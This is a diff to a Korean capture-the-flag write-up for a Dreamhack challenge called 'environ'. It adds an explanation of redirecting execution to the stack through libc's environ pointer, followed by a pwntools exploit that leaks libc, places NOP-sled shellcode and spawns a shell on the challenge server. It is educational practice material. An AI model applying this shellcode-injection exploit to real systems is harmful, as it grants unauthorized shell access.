@@ -94,9 +94,51 @@ jump();
 여기서 value에 사용자가 입력한 주소가 들어가고 그 주소가 가리키는 값을 함수 주소로 삼아 실행합
 
 만약 value에 &environ 주소를 넣는다면?   
-jump는 *(&environ), 즉 environ 값(스택 주소)이 되어 프로그램은 environ이 가리키는 스택 지점을 실행하게 된다. 
+jump는 *(&environ), 즉 environ 값(스택 주소)이 되어 프로그램은 environ이 가리키는 스택 지점을 실행하게 된다. 이렇게 되면
+
+1. Libc Base 및 environ 주소 계산
+2. 스택 오프셋 확인 (디버깅)
+
+해서 알아낼 수있다. 
+
+## 3. 익스플로잇 코드
+
+```python
+from pwn import *
+
+p = remote("host3.dreamhack.games", 20000) 
+e = ELF("./environ")
+libc = ELF("./libc.so.6")
+
+# 2. Libc Base Leak
+p.recvuntil(b"stdout: ")
+stdout_addr = int(p.recvline(), 16)
+
+# stdout 주소에서 라이브러리 내 stdout 오프셋을 빼서 base를 구함
+libc_base = stdout_addr - libc.symbols['_IO_2_1_stdout_']
+# jump의 value로 넘겨줄 &environ 주소 계산
+environ_ptr_addr = libc_base + libc.symbols['environ']
+
+log.info(f"Libc Base: {hex(libc_base)}")
+log.info(f"&environ: {hex(environ_ptr_addr)}")
+
+# 3. Stack Leak 우회 및 Shellcode 배치
+shellcode = asm(shellcraft.sh())
+payload = b"\x90" * 118 + shellcode 
+
+# 4. 데이터 전송
+p.sendlineafter(b"Size: ", str(len(payload)).encode())
+p.sendafter(b"Data: ", payload)
+
+# 5. Jump 실행
+p.sendlineafter(b"*jmp=", str(environ_ptr_addr).encode())
+
+# 6. 쉘 획득
+p.interactive()
+```
 
 
+## 4. 실행 결과
 
 
 
